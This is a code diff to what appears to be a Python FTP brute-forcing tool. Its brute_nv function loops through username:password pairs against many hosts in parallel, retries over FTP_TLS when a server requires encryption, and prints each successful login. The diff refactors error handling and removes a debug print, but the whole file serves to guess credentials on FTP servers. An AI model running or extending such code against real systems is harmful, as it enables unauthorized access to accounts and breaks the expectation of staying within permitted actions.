@@ -80,8 +80,8 @@ def brute_nv(host, creds: list[str], errors, verbose):
         port  = int(host.split(":")[1])
         
         for cred in creds:
-            username, password = cred.split(":")
             try:
+                username, password = cred.split(":")
                 ftp = FTP()
                 ftp.connect(ip, port, timeout=10)
                 l = ftp.login(username, password)
@@ -89,9 +89,9 @@ def brute_nv(host, creds: list[str], errors, verbose):
                     print(f"[+] {host} => {username}:{password}")
             except Error as e:
                 if "must use encryption" in str(e):
-                    ftp = FTP_TLS()
-                    ftp.connect(ip, port, timeout=10)
                     try:
+                        ftp = FTP_TLS()
+                        ftp.connect(ip, port, timeout=10)
                         l = ftp.login(username, password)
                         if "230" in l:
                             print(f"[+] {host} => {username}:{password}")
@@ -101,6 +101,7 @@ def brute_nv(host, creds: list[str], errors, verbose):
                     except Error as eee:
                         if errors: print("Error:", eee)
                         continue
+                else: continue
     except Exception as e: 
         if errors: print("Error:", e)
         
@@ -150,8 +151,7 @@ def brute_nv(hosts: list[str], creds: list[str], threads, errors, verbose):
     with ThreadPoolExecutor(threads) as executor:
         for host in hosts:
             futures.append(executor.submit(brute_nv, host, creds, errors, verbose))
-        for a in as_completed(futures):
-            print(1)
+
         
 def ssl(hosts):
     dict = {}
